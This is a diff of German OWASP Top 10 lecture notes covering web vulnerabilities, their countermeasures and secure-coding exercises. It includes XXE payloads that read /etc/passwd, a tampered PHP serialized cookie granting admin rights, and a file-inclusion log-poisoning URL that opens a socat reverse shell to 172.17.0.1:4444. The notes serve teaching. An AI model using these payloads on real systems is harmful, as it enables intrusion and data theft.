-Beispiele - Unsauber definierte Berechtigungen für Cloud-Services - Unnötige Funktionalität installiert und/oder aktiviert (Ports/Dienste/Benutzerkonten etc.) - Standardbenutzerkonten und Standardpasswörter - Detailinformationen (e.g. Stack Traces) in Fehlermeldungen - System veraltet - Keine sichere Vorbelegung - Directory Listing aktiviert
-Auswirkung - Unberechtigter Zugriff auf Daten und Funktionen, manchmal sogar das ganze System
+- **Beispiele** 
+	- **Unsauber definierte Berechtigungen** für Cloud-Services 
+	- **Unnötige Funktionalität** installiert und/oder aktiviert (Ports/Dienste/Benutzerkonten etc.) 
+	- **Standardbenutzerkonten** und Standardpasswörter 
+	- Detailinformationen (e.g. **Stack Traces**) in Fehlermeldungen 
+	- System **veraltet**
+	- **Keine sichere Vorbelegung** 
+	- **Directory Listing** aktiviert
+- **Auswirkung** 
+	- Unberechtigter Zugriff auf Daten und Funktionen, manchmal sogar das ganze System
 
 #### Gegenmaßnahmen
 
-- Implementierung von sicheren Installationsprozessen
+- Implementierung von **sicheren Installationsprozessen**
   - Wiederholbar, automatisierbar
   - Verwendung einer minimalen Plattform
   - Regelmäßige Updates
@@ -1335,85 +1348,205 @@ Auswirkung - Unberechtigter Zugriff auf Daten und Funktionen, manchmal sogar das
 
 #### XML External Entities (XXE)
 
-Ablauf - XML-Dokument enthält Verweis (URI) auf eine externe Entität - XML-Dokument wird auf eine Web-Seite hochgeladen - Web-Seite verarbeitet das XML-Dokument durch einen verwundbaren XML-Prozessor - Der XML-Prozessor löst den Verweis auf die externe Entität auf und wertet diese aus - Dadurch wird der Schadcode ausgeführt
-Auswirkungen - Auslesen von Daten - Anfragen ausgehend vom übernommenen Server verschicken - Interne Systeme "scannen" - DoS
-Angriff - Auslesen von Dateien aus dem Dateisystem des Servers:
-`<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>` - Durchführen von Anfragen auf Server, auf die ein Angreifer sonst nicht direkt zugreifen kann. Dadurch lassen sich auf Firewalls umgehen oder die Quelle von Angriffen wie Port-Scans verschleiern
-`<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://server.com/path" >]> <foo>&xxe;</foo>`
-Ursachen - Anwendunge akzeptiert direkt oder per Upload XML-Dokumente aus nicht vertrauenswürdigen Quellen - Anwendung fügt nicht vertrauenswürdige Daten in XML-Dokumente ein - SOAP vor 1.2
-Gegenmaßnahmen - Schwachstellen Scan durchführen - Verwendung einfacher Datenformate e.g. JSON - Serialisieren sensibler Daten vermeiden - XML-Prozessoren Updaten - SOAP aktualisieren - Verarbeitung von externen XML-Entitäten ausschalten
+- **Ablauf** 
+	- XML-Dokument enthält Verweis (URI) auf eine externe Entität 
+	- XML-Dokument wird auf eine Web-Seite hochgeladen 
+	- Web-Seite verarbeitet das XML-Dokument durch einen verwundbaren XML-Prozessor 
+	- Der XML-Prozessor löst den Verweis auf die externe Entität auf und wertet diese aus 
+	- Dadurch wird der Schadcode ausgeführt
+- **Auswirkungen** 
+	- Auslesen von Daten 
+	- Anfragen ausgehend vom übernommenen Server verschicken 
+	- Interne Systeme "scannen" 
+	- DoS
+- **Angriff** 
+	- Auslesen von Dateien aus dem Dateisystem des Servers:
+	```xml
+	<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>
+	```
+ 	- Durchführen von Anfragen auf Server, auf die ein Angreifer sonst nicht direkt zugreifen kann. Dadurch lassen sich auf Firewalls umgehen oder die Quelle von Angriffen wie Port-Scans verschleiern
+	```xml
+	<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://server.com/path" >]> <foo>&xxe;</foo>
+	```
+- **Ursachen** 
+	- Anwendunge akzeptiert direkt oder per Upload XML-Dokumente aus nicht vertrauenswürdigen Quellen 
+	- Anwendung fügt nicht vertrauenswürdige Daten in XML-Dokumente ein 
+	- SOAP vor 1.2
+- **Gegenmaßnahmen**
+	- Schwachstellen Scan durchführen 
+	- Verwendung einfacher Datenformate e.g. JSON 
+	- Serialisieren sensibler Daten vermeiden 
+	- XML-Prozessoren Updaten 
+	- SOAP aktualisieren 
+	- Verarbeitung von externen XML-Entitäten ausschalten
 
 ### A6: Nicht aktuelle Komponenten mit Schwachstellen
 
-Anwendung enthält Schwachstellen, die bereits bekannt sind und für die es vielleicht sogar schon vorbereitete Angriffe (Exploits) gibt. Schwachstellen kommen häufig durch die Verwendung von Drittkomponenten wie Frameworks oder Bibliotheken in die Anwendung.
+Anwendung enthält **bekannte Schwachstellen**, für die es vielleicht sogar schon vorbereitete Angriffe (Exploits) gibt. Schwachstellen kommen häufig durch die Verwendung von Drittkomponenten wie Frameworks oder Bibliotheken in die Anwendung.
 
-Beispiele - Version direkt oder indirekt verwendeter Komponenten sind nicht bekannt - Komponenten nicht aktuell oder werden nicht mehr gewartet - Kein regelmäßiger Schwachstellenscan - Kompatibilität von neuen Versionen wird nicht getestet
-Auswirkungen - Gering bis komplette Übernahme des Systems
-Angriffsszenarien - Komponenten laufen mit denselben Berechtigungen wie die Anwendung in denen sie verwendet werden. Verursacht durch e.g. Programmierfehler oder Backdoor - Ermitteln von IoT-Komponenten mit bekannten Schwachstellen e.g. Heartbleed über eine Suchmaschine
-Maßnahmen - Entfernen von nicht verwendeten Abhängigkeiten und unnötiger Funktionalität - Regelmäßige Inventarisierung - OWASP Dependency Check durch Maven-Plugin e.g. `mvn verify` oder `mvn org.owasp:dependency-check-maven:check` - Mitverfolgen von sicherheitsrelevanten Nachrichten - Komponenten nur aus öffentlichen Quellen und aus sicheren Verbindungen beziehen - Virtual Patching von nicht mehr maintainten Komponenten
+- **Beispiele** 
+	- Version direkt oder indirekt verwendeter Komponenten sind nicht bekannt 
+	- Komponenten **nicht aktuell** oder werden **nicht mehr gewartet**
+	- **Kein regelmäßiger Schwachstellenscan** 
+	- **Kompatibilität** von neuen Versionen wird **nicht getestet**
+- **Auswirkungen** 
+	- Gering bis komplette **Übernahme des Systems**
+- **Angriffsszenarien** 
+	- Komponenten laufen mit denselben Berechtigungen wie die Anwendung in denen sie verwendet werden. Verursacht durch e.g. Programmierfehler oder Backdoor 
+	- Ermitteln von IoT-Komponenten mit bekannten Schwachstellen e.g. Heartbleed über eine Suchmaschine
+- **Maßnahmen** 
+	- **Entfernen** von **nicht verwendeten Abhängigkeiten** und unnötiger Funktionalität 
+	- Regelmäßige **Inventarisierung** 
+	- **OWASP Dependency Check** durch Maven-Plugin e.g. `mvn verify` oder `mvn org.owasp:dependency-check-maven:check` 
+	- **Mitverfolgen** von sicherheitsrelevanten **Nachrichten** 
+	- Komponenten nur aus **öffentlichen Quellen** und aus sicheren Verbindungen beziehen 
+	- **Virtual Patching** von nicht mehr maintainten Komponenten
 
 ### A7: Fehlerhafte Identifizierung und Authentifizierung
 
-Fehler bei der Bestätigung der Identität von Benutzern, der Authentisierung oder der Sitzungsverwaltung
+**Fehler bei der Bestätigung der Identität** von Benutzern, der Authentisierung oder der Sitzungsverwaltung
 
-Beispiele - Anwendung erlaubt brute-force Angriffe - Anwendung verwendet Standardpasswörter oder schwache Passwörter - Schwache Methode zum wiederherstellen des Zugangs nach Passwortverlust - Speichern von Passwörtern im Klartext oder mit schwacher Hash-Funktion - Keine Mehrfaktorauthentifizierung - Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von Session-IDs)
-Angriffsszenarien - Credential Stuffing (Brute Force mit dictionary) - Erraten schwacher Passwörter
-Maßnahmen - Mehrfaktorauthentifizierung - Anwendungen nie mit Standardzugangsdaten ausstatten - Neue oder geänderte Paswörter auf ihre Stärke überprüfen. Auch prüfen, ob diese zu den 10.000 schlechtesten Passwörtern gehören - Aktuelle Standards berücksichtigen - Härtung gegen Enumeration Attacks - Fehlgeschlagene Anmeldungsversuche begrenzen
+- **Beispiele** 
+	- Anwendung erlaubt brute-force Angriffe 
+	- Anwendung verwendet **Standardpasswörter** oder schwache Passwörter 
+	- **Schwache Methode zum wiederherstellen des Zugangs** nach Passwortverlust 
+	- **Speichern** von Passwörtern **im Klartext** oder mit schwacher Hash-Funktion 
+	- **Keine Mehrfaktorauthentifizierung**
+	- Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von Session-IDs)
+- **Angriffsszenarien**
+	- Credential Stuffing (Brute Force mit dictionary) 
+	- Erraten schwacher Passwörter
+- **Maßnahmen**
+	- **Mehrfaktorauthentifizierung**
+	- Anwendungen **nie** mit **Standardzugangsdaten** ausstatten 
+	- **Neue** oder geänderte **Passwörter** auf ihre **Stärke überprüfen**. Auch prüfen, ob diese zu den 10.000 schlechtesten Passwörtern gehören 
+	- Aktuelle **Standards berücksichtigen**
+	- Härtung gegen Enumeration Attacks 
+	- Fehlgeschlagene Anmeldungsversuche begrenzen
 
 #### Fehlerhaftes Session-Management
 
-Bedrohung - Angreifer übernimmt die Sitzung eines authentifizierten Nutzers
-Ursachen - Zu einfache oder nicht verschlüsselte Passwörter - Angreifer erhält Zugriff auf die Session ID - Keine Mehrfaktorauthentifizierung
+- **Bedrohung**
+	- Angreifer **übernimmt** die **Sitzung** eines authentifizierten Nutzers
+Ursachen 
+	- Zu einfache oder nicht verschlüsselte Passwörter 
+	- Angreifer erhält Zugriff auf die Session ID - Keine Mehrfaktorauthentifizierung
 
-- Beispiele - `jsessionid` in URL e.g. `http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQ SNDLPSKHCJUN2JV?dest=Hawaii` - Gültigkeitsdauer einer Sitzung zu lange
-- Defizite beim Session-Management - HTTP zustandslos - Session vom Benutzer über mehrere Anfragen hinweg zu identifizieren - Session-IDs als Authentisierungstokens - Durchgängige verwendung von SSL - Fehlende Cookie-Optionen (`http-only`, `secure`) oder fehlender `session-timeout` - Session-IDs nicht ausreichend zufällig - Schwache Passwörter
-  Schutz der Session ID - Session-ID nur per SSL übertragen - Zugriff auf Session-ID durch Clientseitige Skripte unterbinden - Timeout für automatischen Logout setzen - Cookie als "Tracking Mode" für die `JSESSIONID` konfigurieren - Alle `<http-method>`-Tags entfernen
-  Beispiel durch Maßnahmen in `web.xml`:
-  `<session-config> <cookie-config> <secure> true </secure> <http-only> true </http-only> </cookie-config> <session-timeout> 15 </session-timeout> <tracking-mode> COOKIE </tracking-mode> </session-config>`
-  Gegenmaßnahmen - Brute Force durch ausprobieren von Passwörtern durch CAPCHAs verhindern - Schlechte Logout-Funktionalität absichern, indem Session-Informationen vollständig gelöscht werden - Keine Passwörter im Klartext speichern, sondern auf Hash-Funktionen mit Salt verlassen - Bei jedem Zugriff auf eine Seite im Intranet muss geprüft werden, ob eine Authentisierung stattgefunden hat
+- **Beispiele** 
+	- `jsessionid` in URL e.g. `http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQ SNDLPSKHCJUN2JV?dest=Hawaii` 
+	- Gültigkeitsdauer einer Sitzung zu lange
+	- Defizite beim Session-Management 	
+	- HTTP zustandslos 
+	- Session vom Benutzer über mehrere Anfragen hinweg zu identifizieren 
+	- Session-IDs als Authentisierungstokens 
+	- Durchgängige verwendung von SSL 
+	- Fehlende Cookie-Optionen (`http-only`, `secure`) oder fehlender `session-timeout` 
+	- Session-IDs nicht ausreichend zufällig 
+	- Schwache Passwörter
+- **Schutz der Session ID** 
+	- Session-ID nur per SSL übertragen 
+	- Zugriff auf Session-ID durch Clientseitige Skripte unterbinden 
+	- Timeout für automatischen Logout setzen 
+	- Cookie als "Tracking Mode" für die `JSESSIONID` konfigurieren 
+	- Alle `<http-method>`-Tags entfernen
+- **Beispiel durch Maßnahmen in `web.xml`**
+```xml
+<session-config> 
+	<cookie-config> 
+		<secure>
+			 true 
+		</secure> 
+		<http-only>
+			 true 
+		</http-only> 
+	</cookie-config> 
+	<session-timeout> 
+		15 
+	</session-timeout> 
+	<tracking-mode> 
+		COOKIE 
+	</tracking-mode> 
+</session-config>
+```
+- **Gegenmaßnahmen** 
+	- Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs verhindern 
+	- Schlechte Logout-Funktionalität absichern, indem Session-Informationen vollständig gelöscht werden 
+	- Keine Passwörter im Klartext speichern, sondern auf Hash-Funktionen mit Salt verlassen 
+	- Bei jedem Zugriff auf eine Seite im Intranet muss geprüft werden, ob eine Authentisierung stattgefunden hat
 
-### A8; Fehlerhafte Software und Datenintegrität
+### A8: Fehlerhafte Software und Datenintegrität
 
-Treffen von Annahmen e.g. über Software-Updates, kritische Daten oder CI/CD Pipelines ohne deren Gültigkeit zu überprüfen
+Treffen von **Annahmen** e.g. über Software-Updates, kritische Daten oder CI/CD Pipelines **ohne** deren **Gültigkeit zu überprüfen**
 
-Beispiele - Anwendungen verwenden Bibliotheken aus nicht vertrauenswürdigen Quellen oder CDNs - Durch unsichere CI/CD-Pipeline besteht Möglichkeit zum unberechtigten Zugriff - Automatische Updates ohne Integritätsprüfung
-Angriffsszenarien - Update ohne Signatur - Router oder andere Geräte prüfen oft nicht auf Signaturen und sind leichte Angriffsziele - Solarwinds: Updates mit Schadcode - Sichere Buildprozesse umgangen und Schadcode eingeschläust
+- **Beispiele** 
+	- Anwendungen verwenden Bibliotheken aus nicht vertrauenswürdigen Quellen oder CDNs 
+	- Durch unsichere CI/CD-Pipeline besteht Möglichkeit zum unberechtigten Zugriff 
+	- Automatische Updates ohne Integritätsprüfung
+- **Angriffsszenarien**
+	- Update ohne Signatur 
+	- Router oder andere Geräte prüfen oft nicht auf Signaturen und sind leichte Angriffsziele 
+	- Solarwinds: Updates mit Schadcode 
+	- Sichere Buildprozesse umgangen und Schadcode eingeschläust
 
 #### Gegenmaßnahmen
-
-    - Verwenden digitaler Signaturen
-    - Sicherstellen, dass Dependencies aus vertauenswürdigen Repositories stammen
-    - Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain eingesetzt werden e.g. OWASP Dependency Check
-    - Review Process fÜr Code- und Konfigurationsänderungen
-    - Saubere Trennung, Konfiguration und Zugangssteuerung in der CI/CD Pipeline
-    - Serialisierte Daten nur signiert oder verschlüsselt übertragen
+- Verwenden digitaler **Signaturen**
+- Sicherstellen, dass Dependencies aus **vertauenswürdigen Repositories** stammen
+- Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain eingesetzt werden e.g. **OWASP Dependency Check**
+- **Review Process** fÜr Code- und Konfigurationsänderungen
+- **Saubere** Trennung, Konfiguration und Zugangssteuerung in der **CI/CD Pipeline**
+- **Serialisierte Daten** nur **signiert** oder **verschlüsselt** übertragen
 
 #### Unsichere Deserialisierung
 
 Anwendunge enthäkt serialisierte Objekte/Datenstrukturen e.g. als XML-, JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf
 
-- Die serialisierten Daten können manipuliert sein, um gezielt Werte zu verändern oder Code auf dem Zielsystem auszuführen
-- Anfällt sind e.g. - Fern- und Interprozesskommunikation: RPC und IPC - Web Services - Message Broker - Caching- / Persistenz-Komponenten - HTTP Cokoies, HTML Formulare, Tokens zur Authentifizierung über APIs
-  Auswirkungen - Komplette übernahme des Zielsystems und eventuelle Ausbreitung
-  Angriffsszenarien - Eine PHP-Anwendunge verwendet Objektserialisierung, um "Super-Cookie" zu speichern
-  `a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}` - Angreifer modifiziert das serialisierte Objekt, um sich selbst administrative Rechte zu geben
+- Die **serialisierten Daten** können **manipuliert** sein, um gezielt Werte zu verändern oder Code auf dem Zielsystem auszuführen
+- **Anfällig** sind e.g. 
+	- Fern- und Interprozesskommunikation: RPC und IPC 
+	- **Web Services** 
+	- Message Broker 
+	- Caching- / Persistenz-Komponenten 
+	- HTTP **Cookies**, HTML Formulare, **Tokens** zur Authentifizierung über APIs
+- **Auswirkungen** 
+	- Komplette **Übernahme** des Zielsystems und eventuelle Ausbreitung
+- **Angriffsszenarien** 
+	- Eine PHP-Anwendung verwendet Objektserialisierung, um "Super-Cookie" zu speichern
+  `a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}` 
+	- Angreifer modifiziert das serialisierte Objekt, um sich selbst administrative Rechte zu geben
   `a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}`
-
-      - Eine React-Anwendunge ruft verschiedene Spring-Boot Microservices auf
-      - Durch Verwendung des funktionales Programmierparadigmas soll der Code der Anwendung unveränderbar sein (immutable)
-      - Zur Realisierung wird der Anwendungszustand mit jeder Anfrage zwischen Client und Server serialisiert hin- und hergeschickt
+	- Eine React-Anwendunge ruft verschiedene Spring-Boot Microservices auf
+	- Durch Verwendung des funktionales Programmierparadigmas soll der Code der Anwendung unveränderbar sein (immutable)
+	- Zur Realisierung wird der Anwendungszustand mit jeder Anfrage zwischen Client und Server serialisiert hin- und hergeschickt
       Angriff
-          - Einem Angreifer fällt die Java-Object-Signatur "R00" auf
-          - Der Angreifer verndet dann die "Java Serial Killer"-Erweiterung für Burp-Suite, um eigenen Code auf dem Server auszuführen
+	- Einem Angreifer fällt die Java-Object-Signatur "R00" auf
+	- Der Angreifer verndet dann die "Java Serial Killer"-Erweiterung für Burp-Suite, um eigenen Code auf dem Server auszuführen
 
-  Gegenmaßnahmen - Keine serialisierten Objekte aus nicht vertrauenswürdigen Quellen akzeptieren - Nur Serialisierungsmedien verwenden, die ausschließlich primitive Datentypen erlauben - Signaturen - Typenprüfung - Code zur Deserialisierung in isolierter Umgebung ausführen
+- **Gegenmaßnahmen**
+	- **Keine serialisierten Objekte aus nicht vertrauenswürdigen Quellen** akzeptieren 
+	- Nur Serialisierungsmedien verwenden, die ausschließlich **primitive Datentypen** erlauben 
+	- **Signaturen**
+	- **Typenprüfung**
+	- Code zur Deserialisierung in **isolierter Umgebung** ausführen
 
 ### A9: Fehlerhaftes Logging und Monitoring
 
-Angriffe und Angriffsversuche werden nicht erkannt, wenn nicht alle Aktionen protokolliert werden. Wenn Angreifer evtl. Zugriff auf Log-Einträge haben, ist das Entwurfsmuster "Fehlerhafte Berechtigungsprüfung" zu erkennen.
+Angriffe und **Angriffsversuche** werden **nicht erkannt**, wenn nicht alle Aktionen protokolliert werden. Wenn Angreifer evtl. Zugriff auf Log-Einträge haben, ist das Entwurfsmuster "Fehlerhafte Berechtigungsprüfung" zu erkennen.
 
-Beispiele - Nicht protokollierte erfolgreiche und fehlgeschlagene Login-Versuche - Nicht protokolloerte Systemaktionen - Fehler, Ausnahmen und Warnungen werden nicht oder nicht ausreichend protokolliert - Log-Dateien werden nicht automatisiert auf verdächtiges Verhalten überwacht - Logs werden nur lokal gespeichert - Uhrzeiten sind nicht synchronisiert - Es sind keine angemessenen Schwellwerte für das Auslösen von Alarmen festgelegt - Es werden keine Alarme ausgelöst, wenn ein Pentest durchgeführt wird - Angriffe werden nicht in Echtzeit erkannt
-Angriffsszenarien - Angreifer scannen eine Anwendung auf typische Passwörter und sehen nur fehlgeschlagene Logins - Brute Force möglich - Firma verwendet Sandbox zur Analyse von E-mail anhängen - Schadsoftware wird in Anhang gepackt, erkannt, aber niemand kümmert sich darum
+- **Beispiele** 
+	- **Nicht protokollierte** erfolgreiche und fehlgeschlagene **Login-Versuche**
+	- Nicht protokollierte Systemaktionen 
+	- **Fehler**, Ausnahmen und Warnungen werden nicht oder **nicht ausreichend protokolliert**
+	- Log-Dateien werden nicht automatisiert auf verdächtiges Verhalten überwacht 
+	- Logs werden nur lokal gespeichert 
+	- **Uhrzeiten sind nicht synchronisiert**
+	- Es sind **keine** angemessenen **Schwellwerte** für das Auslösen von **Alarmen** festgelegt 
+	- Es werden keine Alarme ausgelöst, wenn ein Pentest durchgeführt wird 
+	- **Angriffe werden nicht in Echtzeit erkannt**
+- **Angriffsszenarien**
+	- Angreifer scannen eine Anwendung auf typische Passwörter und sehen nur fehlgeschlagene Logins 
+	- **Brute Force** möglich 
+	- Firma verwendet Sandbox zur Analyse von E-mail anhängen 
+	- Schadsoftware wird in Anhang gepackt, erkannt, aber niemand kümmert sich darum
 
 #### Gegenmaßnahmen
 
@@ -1429,27 +1562,44 @@ Angriffsszenarien - Angreifer scannen eine Anwendung auf typische Passwörter un
 
 Eine Anwendung lädt eine Resource (über das Netzwerk) anhand einer URL, die vom Benutzer angegeben wird, ohne diese URL zu überprüfen
 
-Beispiel - Angreifer stellt einen Request zusammen und zwingt die Anwendung diese Request an ein Ziel zuschicken, welches so von der Anwendung nicht vorgesehen war
-Probleme - Funktioniert auch, wenn Schutzmechanismen vorhanden sind, wie e.g. - Web Application Firewall - VPN - Network Access Control List (ACL) - Das Laden von Inhalten über URLs ist gerade in modernen Web-Anwendungen ein grundlegender Mechanismus, siehe AJAX oder fetch-API
-Angriffsszenarien - Scan der Ports interner Server - Wenn das Netzwerk nicht segmentiert ist, können Angreifer die internen Systeme ermitteln und auch herausfinden, ob Ports auf internen Servern offen oder geschlossen sind - Port-Scan funktioniert dadurch, dass die Ergebnisse von Verbindungen zu internen Servern mittels SSRF ausgewertet werden - Abhängig vom Ergebnis oder der Responsetime ergibt sich dann, ob Port offen oder geschlossen ist - Preisgabe von sensiblen Daten - Angreifer können auf lokale Dateien oder interne Dienste zugreifen, um sensible Informationen zu gewinnen. - Siehe dazu den seperaten Abschnitt zu "File Inclusion" - Zugriff auf Metadatenspeicher von Cloud-Diensten - Viele Cloud-Anbieter haben einen Metadatenspeicher - Angreifer können mittels SSRF die Metadaten auslesen und so sensible Informationen gewinnen - Kompromittieren interner Dienste - Angreifer können interne Dienste missbrauchen, um weitere Angriffe durchzuführen (Remote Code Execution, DoS)
+- **Beispiel** 
+	- Angreifer stellt einen Request zusammen und **zwingt die Anwendung diese Request an ein Ziel zuschicken**, welches so von der Anwendung nicht vorgesehen war
+- **Probleme**
+	- Funktioniert auch, wenn Schutzmechanismen vorhanden sind, wie e.g. 
+		- Web Application Firewall 
+		- VPN 
+		- Network Access Control List (ACL) 
+		- Das Laden von Inhalten über URLs ist gerade in modernen Web-Anwendungen ein grundlegender Mechanismus, siehe AJAX oder fetch-API
+- **Angriffsszenarien**
+	- **Scan der Ports** interner Server 
+	- Wenn das Netzwerk nicht segmentiert ist, können Angreifer die **internen Systeme ermitteln** und auch herausfinden, ob Ports auf internen Servern offen oder geschlossen sind 
+	- Port-Scan funktioniert dadurch, dass die Ergebnisse von Verbindungen zu internen Servern mittels SSRF ausgewertet werden 
+	- Abhängig vom Ergebnis oder der Responsetime ergibt sich dann, ob Port offen oder geschlossen ist 
+	- **Preisgabe von sensiblen Daten** 
+	- Angreifer können auf lokale Dateien oder interne Dienste zugreifen, um sensible Informationen zu gewinnen. 
+	- Zugriff auf Metadatenspeicher von Cloud-Diensten 
+	- Viele Cloud-Anbieter haben einen Metadatenspeicher 
+	- Angreifer können mittels SSRF die Metadaten auslesen und so sensible Informationen gewinnen 
+	- Kompromittiere interner Dienste 
+	- Angreifer können interne Dienste missbrauchen, um weitere Angriffe durchzuführen (Remote Code Execution, DoS)
 
 #### Gegenmaßnahmen
 
-- Mehrstufige Verteidigung
+- **Mehrstufige Verteidigung**
 - Maßnahmen auf Netzwerkebene
-  - Netzwerksegmentierung
-  - Deny by default
+  - **Netzwerksegmentierung**
+  - **Deny by default**
 - Maßnahmen auf Anwendungsebene
-  - Bereinigen und Validieren sämtlicher Eingabedaten, die vom Client kommen
-  - Positivlisten
+  - Bereinigen und **Validieren sämtlicher Eingabedaten**, die vom Client kommen
+  - **Positivlisten**
   - Keine Antworten im Reinformat senden
   - HTTP-Umleitung ausschalten
 - Zusätzliche Maßnahmen
-  - Keine anderen sicherheitsrelevanten Diente auf System installieren, die direkt vom Internet aus zugänglich sind
+  - **Keine anderen sicherheitsrelevanten Diente auf System installieren**, die direkt vom Internet aus zugänglich sind
 
 #### File Inclusion
 
-Anfälliger Code:
+- **Anfälliger Code**
 
 ```php
 <?php
@@ -1461,6 +1611,8 @@ Anfälliger Code:
     include($file);
 ?>
 ```
+
+- **Angriff**
 
 ```bash
 nc 172.17.0.1 80 # Connect via netcat
@@ -1495,41 +1647,41 @@ Socat:
 localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&page=../../../../../../../../var/log/apache2/access.log
 ```
 
-Gegenmaßnahmen:
+- **Gegenmaßnahmen**
 
-- Eingabevalidierung
+- **Eingabevalidierung**
 - Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen Switch-case mit den möglichen Files
 
 ## Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)
 
 ### Implementierung einer Datenstruktur in Java
 
-Gegeben sei die folgende Definition einer Datenstruktur:
+Gegeben sei die **folgende Definition** einer Datenstruktur:
 
 ```java
 List<String> data = new ArrayList<String>(MAX);
 ```
 
-Dabei ist MAX folgendermaßen definiert:
+Dabei ist **MAX** folgendermaßen definiert:
 
 ```java
 private static fional int MAX = 100;
 ```
 
-Eine Methode mit der untenstehenden Signatur soll einen Wert an einer bestimmten Position in der Datenstruktur `data` eintragen
+Eine Methode mit der untenstehenden Signatur soll einen **Wert an einer bestimmten Position in der Datenstruktur `data` eintragen**
 :
 
 ```java
 void setElementToExtraPosition(int extra, String element);
 ```
 
-Die Position soll berechnet werden aus der aktuellen Position (`current`) und dem als Methodenparameter angegebenen Versatz (`extra`). Sowohl `current`, als auch `extra` sollen vom Typ `int` sein.
+Die Position soll **berechnet** werden aus der aktuellen **Position** (`current`) und dem als Methodenparameter angegebenen **Versatz** (`extra`). Sowohl `current`, als auch `extra` sollen vom Typ `int` sein.
 
-Falls die neue Einfügeposition außerhalb des Wertebereichs der Indizes der Datenstruktur liegt, soll eine Ausnahme (`IllegalArgumentException`) ausgelöst werden.
+**Falls** die neue **Einfügeposition** außerhalb des Wertebereichs der Indizes der Datenstruktur liegt, soll eine **Ausnahme** (`IllegalArgumentException`) **ausgelöst werden**.
 
 Rufen Sie die Funktion `setElementToExtraPosition()` mit verschiedenen Werten auf.
 
-Was geschieht, wenn Sie folgende Werte verwenden:
+Was geschieht, wenn Sie **folgende Werte** verwenden:
 
 ```java
 current = 50
@@ -1626,9 +1778,9 @@ public class IntegerOverflow {
 
 ### Secure Coding
 
-Implementieren Sie die mit TODO markierten stellen
+Implementieren Sie die mit **TODO** markierten stellen
 
-Das Vorhandensein eines `AttackThreads` gibt Ihnen einen Hinweis worauf Sie in Ihren Implementierungen achten sollten.
+Das Vorhandensein eines `AttackThreads` gibt Ihnen einen **Hinweis** worauf Sie in Ihren Implementierungen achten sollten.
 
 Was müssen Sie noch in Ihrer Implementierung beachten?
 
@@ -1833,16 +1985,16 @@ TOOD: Add Interpretation
 
 **Authentisierung**
 
-- Nachweis einer Eigentschaft / Bezeugung der Echtheit
+- **Nachweis einer Eigenschaft** / Bezeugung der Echtheit
 - i.d.R.
-  - Sicherstellung der Identität
+  - **Sicherstellung der Identität**
   - Nachweis einer Person, dass sie tatsächlich diejenige Person ist, die sie vorgibt zu sein
   - Person legt also Nachweise vor, die ihre Identität bestätigen sollen
   - Beantwortung der Frage "Wer bin ich?"
 
 **Authentifizierung**
 
-- Prüfung der behaupteten Authentisierung / Vorgang der Echtheitsprüfung
+- **Prüfung der behaupteten Authentisierung** / Vorgang der Echtheitsprüfung
 - Verifizieren der behaupteten Eigenschaft durch Überprüfen der vorgelegten Nachweise
 - Authentifizierung gilt solange, bis der betreffende Kontext bzw. betreffende Modus verlassen oder verändert wird
 
@@ -1850,15 +2002,15 @@ TOOD: Add Interpretation
 
 **Autorisierung**
 
-- Einräumen von speziellen Rechten für authentifizierte Personen / Systeme
+- **Einräumen von speziellen Rechten** für authentifizierte Personen / Systeme
 - Zuweisung von Rechten in Abhängigkeit der jeweiligen Identität
 - Rolle `r` hat Berechtigung `b`
 
 **Authentisierungsmethoden**
 
-- Wissen: Passwort, PIN
-- Besitz: Token, Zertifikat
-- Eigenschaften: Biometrische Daten
+- **Wissen**: Passwort, PIN
+- **Besitz**: Token, Zertifikat
+- **Eigenschaften**: Biometrische Daten
 
 **Starke Authentisierung**
 
@@ -1889,22 +2041,21 @@ TOOD: Add Interpretation
 - Eintauschen eines Autorisierungs-Codes (authorization code) gegen eine Zugriffsberechtigung (access token)
 - Authorization Code -> Access Token
 
-Vorgehen
-
-- Client bekommt Autorisierungs-Code (authorization code) vom Authorization Server, nachdem der Endnutzer (resource owner) dies erlaubt hat, z.B. durch ein Login mit Benutzername und Passwort auf dem Authorization Server
-- Zuvor muss Client beim Authorization Server registriert sein, damit Authorization Codes nur an vertrauenswürdige Clients herausgegeben werden, also nicht an Clients, die ein Angreifer kontrolliert
-- Client tauscht Autorisierungs-Code dann beim Authorization Server gegen ein Access Token ein
-- Client kann dann mit Access Token auf Ressource beim Resource
-  Server zugreifen
+- **Vorgehen**
+	- Client bekommt Autorisierungs-Code (authorization code) vom Authorization Server, nachdem der Endnutzer (resource owner) dies erlaubt hat, z.B. durch ein Login mit Benutzername und Passwort auf dem Authorization Server
+	- Zuvor muss Client beim Authorization Server registriert sein, damit Authorization Codes nur an vertrauenswürdige Clients herausgegeben werden, also nicht an Clients, die ein Angreifer kontrolliert
+	- Client tauscht Autorisierungs-Code dann beim Authorization Server gegen ein Access Token ein
+	- Client kann dann mit Access Token auf Ressource beim Resource
